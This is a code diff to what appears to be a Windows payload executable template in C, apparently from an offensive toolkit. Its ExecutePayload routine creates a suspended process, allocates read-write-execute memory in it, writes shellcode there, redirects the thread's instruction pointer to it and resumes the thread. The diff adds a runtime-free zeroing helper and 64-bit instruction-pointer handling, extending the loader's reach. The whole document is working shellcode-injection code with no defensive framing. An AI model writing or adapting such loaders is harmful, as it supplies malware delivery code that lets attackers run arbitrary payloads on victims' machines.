@@ -1,6 +1,19 @@
 #include <windows.h>
 #include "template.h"
 
+#if BUILDMODE == 2
+/* hand-rolled bzero allows us to avoid including ms vc runtime */
+void inline_bzero(void *p, size_t l)
+{
+   
+           BYTE *q = (BYTE *)p;
+           size_t x = 0;
+           for (x = 0; x < l; x++)
+                     *(q++) = 0x00;
+}
+
+#endif
+
 
 void ExecutePayload(void);
 
@@ -33,10 +46,11 @@ void ExecutePayload(void) {
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si;
 	CONTEXT ctx;
-	DWORD ep, prot;
+	DWORD prot;
+   LPVOID ep;
 
 	// Start up the payload in a new process
-	ZeroMemory( &si, sizeof( si ));
+	inline_bzero( &si, sizeof( si ));
 	si.cb = sizeof(si);
 
 	// Create a suspended process, write shellcode into stack, make stack RWX, resume it
@@ -44,11 +58,16 @@ void ExecutePayload(void) {
 		ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
 		GetThreadContext(pi.hThread, &ctx);
 
-		ep = (DWORD) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	   ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
         WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);
 
-		ctx.Eip = ep;
+#ifdef _WIN64
+	   ctx.Rip = (DWORD64)ep;
+#else
+	   ctx.Eip = (DWORD)ep;
+#endif
+
         SetThreadContext(pi.hThread,&ctx);
 
         ResumeThread(pi.hThread);
